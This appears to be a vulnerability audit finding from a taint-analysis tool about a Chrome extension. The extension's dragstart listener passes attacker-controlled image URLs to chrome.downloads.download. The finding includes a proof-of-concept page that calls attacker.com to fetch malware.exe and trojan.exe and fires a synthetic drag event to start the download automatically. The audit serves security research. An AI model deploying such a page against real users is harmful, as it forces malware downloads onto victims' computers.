# CoCo Analysis: obfdpipablmakibiibddbeckmiokachl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (same vulnerability, different data attributes)

---

## Sink: document_eventListener_dragstart → chrome_downloads_download_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/obfdpipablmakibiibddbeckmiokachl/opgen_generated_files/cs_0.js
Line 467: document.addEventListener('dragstart', function(event) {
Line 468: let target = event.target;
Line 471: let imageUrl = target.src;
Line 472: if (target.dataset.original)
Line 473: imageUrl = target.dataset.original;
Line 474: else if (target.dataset.src)
Line 475: imageUrl = target.dataset.src;
Line 478: chrome.runtime.sendMessage({action: "downloadImage", url: imageUrl});
```

**Code:**

```javascript
// Content script (cs_0.js) - runs on <all_urls>
document.addEventListener('dragstart', function(event) {
  let target = event.target; // ← attacker-controlled via DOM
  if (target.tagName === 'IMG') {
    // 尝试获取更高分辨率的图片地址
    let imageUrl = target.src; // ← attacker-controlled
    if (target.dataset.original) {
      imageUrl = target.dataset.original; // ← attacker-controlled
    } else if (target.dataset.src) {
      imageUrl = target.dataset.src; // ← attacker-controlled
    }
    // 发送图片地址到背景脚本进行下载
    chrome.runtime.sendMessage({action: "downloadImage", url: imageUrl}); // ← attacker-controlled URL
  }
});

// Background script (bg.js)
chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.action === "downloadImage" && request.url) {
      chrome.downloads.download({
        url: request.url, // ← attacker-controlled URL to chrome.downloads.download
        conflictAction: 'uniquify'
      });
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener (dragstart) on all URLs

**Attack:**

```javascript
// Attacker creates a malicious webpage
<html>
<body>
  <h1>Drag this image to download malware!</h1>
  <img src="https://attacker.com/malware.exe"
       data-original="https://attacker.com/trojan.exe"
       draggable="true">

  <script>
    // Automatically trigger dragstart event
    const img = document.querySelector('img');
    const dragEvent = new DragEvent('dragstart', {
      bubbles: true,
      cancelable: true
    });
    img.dispatchEvent(dragEvent);
  </script>
</body>
</html>
```

**Impact:** Arbitrary file downloads to the victim's computer. An attacker can create a malicious webpage that automatically triggers downloads of malware, executables, or other harmful files when a user with this extension installed visits the page or drags any image element. The extension runs on ALL URLs (`<all_urls>`) and trusts DOM attributes (src, dataset.original, dataset.src) which are fully attacker-controlled.
